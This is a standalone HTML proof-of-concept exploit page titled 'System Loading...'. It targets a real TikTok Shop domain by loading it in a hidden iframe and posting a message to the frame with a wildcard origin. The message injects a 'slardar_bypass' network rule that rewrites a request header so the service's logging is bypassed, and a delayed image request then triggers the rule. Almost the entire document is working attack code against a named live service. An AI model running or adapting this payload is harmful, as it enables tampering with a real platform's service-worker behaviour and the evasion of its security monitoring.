<!DOCTYPE html>
<html>
<head><title>System Loading...</title></head>
<body>
    <iframe id="target" src="https://api-verification.tiktokshop.com/robots.txt" style="display:none;"></iframe>

    <script>
        const frame = document.getElementById('target');
        const payload = {
            source: "main_thread",
            eventName: "network_rule",
            data: [{
                ruleName: "slardar_bypass",
                global: true,
                conditions: [],
                handlers: [{
                    handler: "replace",
                    type: "header",
                    field: "X-Pns-Referrer",
                    value: "VULN_BYPASS_LOGGING"
                }]
            }]
        };

        frame.onload = function() {
            console.log("Infiltrating Service Worker context...");
            // Kirim payload ke context domain tiktokshop
            frame.contentWindow.postMessage(payload, "*");
            
            // Trigger fetch untuk memastikan rule aktif
            setTimeout(() => {
                const img = new Image();
                img.src = "https://api-verification.tiktokshop.com/favicon.ico?trigger=" + Date.now();
            }, 3000);
        };
    </script>
</body>
</html>
